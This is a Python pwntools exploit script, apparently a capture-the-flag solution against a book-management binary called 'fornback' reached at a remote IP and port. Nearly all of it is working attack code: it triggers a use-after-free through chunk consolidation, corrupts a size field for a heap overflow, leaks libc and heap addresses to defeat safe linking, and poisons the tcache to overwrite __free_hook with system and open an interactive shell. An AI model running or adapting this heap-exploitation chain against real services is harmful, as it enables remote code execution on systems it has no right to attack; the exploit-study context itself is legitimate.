#!/ur/bin/env python3

#The program gives us a Use after Free bug when backward and forward consolidation occurs at the same time
#Then using the Use after Free we can give a hige size above the size boundary of the program 
#to get a heap overflow primitive using these both primitives we can get a smallbin leak 
#and then use these primitives to perform a tcache poisoning to get RCE




from pwn import *

#r = process("./fornback")
r = remote("104.197.118.147",10170)
libc = ELF("./libc-2.32.so")
e = ELF("./fornback")

def add(index,length,name):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Book index:",f"{index}")
    r.sendlineafter(b"Length of book name:",f"{length}")
    r.sendafter(b"Book name:",name)

def corrupt_add(index,length):
    r.sendlineafter(b">",b"1")
    r.sendlineafter(b"Book index:",f"{index}")
    r.sendlineafter(b"Length of book name:",f"{length}")

def delete(index):
    r.sendlineafter(b">",b"4")
    r.sendlineafter(b"Book index:",f"{index}")

def edit(index,name):
    r.sendlineafter(b">",b"3")
    r.sendlineafter(b"Book index:",f"{index}")
    r.sendafter(b"Book name:",name)

def read(index):
    r.sendlineafter(b">",b"2")
    r.sendlineafter(b"Book index:",f"{index}")
    r.recvuntil(b"Book name: ")
    val = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return val

add(0,1200,b"A")
add(1,1200,b"B")
add(2,1200,b"C")
add(3,24,b"D" * 16 + p16(0x4e0))
add(4,24,b"E" * 16)
delete(0)
delete(2)
delete(1)
log.info("First Backward and Forward Consolidation performed which gave us a Use after free which we will use it get libc leaks")
corrupt_add(1,4096)
log.info("Size corruption bug to create a heap overflow primitive")
add(0,1200,b"F")
add(2,1200,b"G")
edit(1,b"H" * 1208 + p64(0x4e1))
corrupt_add(3,4096)
edit(3,b"D" * 16 + p64(0x4e0) + p64(0x20))
add(0,1208,b"I")
add(4,40,b"J")
libc_base = read(3) - 0x1c5c10
log.info("The libc base of the process is " + hex(libc_base))
add(0,1200,b"K")
add(1,136,b"L")
add(2,1200,b"M")
add(3,136,b"N")
add(3,136,b"N")
delete(0)
delete(2)
delete(1)
log.info("Another backward and forward consolidation performed to get heap leak to bypass Safe linking mitigation")
heap_leak = (read(1) << 12) + 0x610
heap_base = heap_leak - 0x1610
log.info("The heap base of the process is " + hex(heap_base))
add(0,1200,b"O")
add(1,136,b"P")
add(2,1200,b"Q")
add(3,136,b"R")
add(4,136,b"S")
delete(4)
delete(0)
delete(2)
delete(1)
log.info("Final backward and forward consolidation performed to get RCE")
corrupt_add(1,4096)
edit(1,p64((libc_base + libc.sym.__free_hook) ^ ((heap_base + 0x1610) >> 12)))
add(0,136,b"/bin/sh\x00")
add(1,136,p64(libc_base + libc.sym.system))
delete(0)
r.interactive()
